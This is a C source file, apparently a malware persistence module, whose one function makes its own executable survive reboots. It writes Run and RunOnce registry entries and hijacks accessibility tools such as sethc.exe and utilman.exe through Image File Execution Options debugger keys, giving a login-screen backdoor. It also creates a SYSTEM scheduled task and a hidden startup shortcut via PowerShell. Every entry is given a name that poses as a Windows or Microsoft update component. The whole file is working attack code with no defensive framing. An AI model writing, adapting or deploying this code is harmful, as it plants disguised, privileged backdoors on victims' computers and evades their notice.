#include "persistence.h"
#include <stdio.h>
#include <shlobj.h>

void InstallPersistence(void) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    HKEY hk;
    DWORD dwDisp;

    /* 1. HKCU Run */
    RegCreateKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "WindowsSecurityUpdate", 0, REG_SZ,
                   (BYTE*)exePath, strlen(exePath) + 1);
    RegCloseKey(hk);

    /* 2. HKLM Run */
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "WindowsSecurityUpdate", 0, REG_SZ,
                   (BYTE*)exePath, strlen(exePath) + 1);
    RegCloseKey(hk);

    /* 3. HKCU RunOnce */
    RegCreateKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "WindowsUpdateCheck", 0, REG_SZ,
                   (BYTE*)exePath, strlen(exePath) + 1);
    RegCloseKey(hk);

    /* 4. Accessibility backdoor */
    const char *accessTools[] = {
        "sethc.exe", "magnify.exe", "narrator.exe", "osk.exe",
        "utilman.exe", "displayswitch.exe", "atbroker.exe",
        NULL
    };
    for (int i = 0; accessTools[i]; i++) {
        char regPath[MAX_PATH];
        snprintf(regPath, sizeof(regPath),
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
            accessTools[i]);
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0,
                        KEY_SET_VALUE, NULL, &hk, &dwDisp);
        RegSetValueExA(hk, "Debugger", 0, REG_SZ,
                       (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hk);
    }

    /* 5. Scheduled task */
    {
        char taskCmd[2048];
        snprintf(taskCmd, sizeof(taskCmd),
            "schtasks /create /f /tn \"MicrosoftEdgeUpdateTask\" "
            "/tr \"%s\" /sc ONLOGON /ru SYSTEM /rl HIGHEST", exePath);

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessA(NULL, taskCmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    /* 6. Startup folder shortcut (via PowerShell) */
    {
        char startupPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
        char linkPath[MAX_PATH * 2];
        snprintf(linkPath, sizeof(linkPath), "%s\\WindowsServiceHost.lnk", startupPath);

        char psCmd[4096];
        snprintf(psCmd, sizeof(psCmd),
            "powershell -Command \"$WS = New-Object -ComObject WScript.Shell; "
            "$SC = $WS.CreateShortcut('%s'); $SC.TargetPath = '%s'; "
            "$SC.WindowStyle = 0; $SC.Description = 'Windows Service Host'; "
            "$SC.Save()\"", linkPath, exePath);

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessA(NULL, psCmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}